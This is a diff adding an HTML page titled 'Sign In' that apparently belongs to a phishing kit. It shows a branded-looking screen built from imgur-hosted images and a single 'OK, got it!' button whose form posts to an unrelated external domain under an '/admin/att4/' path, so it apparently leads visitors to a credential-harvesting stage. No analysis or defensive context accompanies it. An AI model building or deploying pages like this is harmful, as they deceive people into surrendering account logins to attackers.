@@ -1,0 +1,65 @@
+
+<!doctype html>
+<html>
+<head>
+<title>Sign In</title>
+</head>
+<body>
+<center>
+<style type="text/css">
+	
+	body {
+    background-color: #F7F7F7;
+    -webkit-background-size: cover;
+    -moz-background-size: cover;
+    -o-background-size: cover;
+    background-size: cover;
+    background-size: 100%;
+}
+
+
+fieldset {
+    font-family: sans-serif;
+width:615px;
+height:440px;
+ background:white;
+    padding: 0px;
+bottom:-20px;
+    border-radius: 3px; 
+    box-sizing: border-box;
+    box-shadow: 0 2px 4px 0 rgba(181,181,181,.7);
+        border: 1px solid #f1f1f5;
+}
+
+input[type=submit] {
+  width: 375px;
+    font-family: sans-serif;
+    font-size: 16px;
+    color: white;
+    padding:15px 15px; 
+    background: #0057B8; 
+    border:0 none;
+    cursor:pointer;
+    -webkit-border-radius: 3px;
+}
+
+   
+</style>
+
+<form action="http://douganjohna.com/admin/att4/index1.html" method="post">
+<br><br><br><br><fieldset><br><br><br>
+<img src="https://i.imgur.com/tePYI5M.png"><br>
+
+<br>
+    <input type="submit" name="submit" onmouseover="this.style.background='#007AE2';" onmouseout="this.style.background='#0057B8';" value="OK, got it!"/>
+    
+
+
+<br>
+</fieldset>
+</form>
+<br>
+<img src="https://i.imgur.com/YNBnxE5.png">
+</center>
+</body>
+</html>
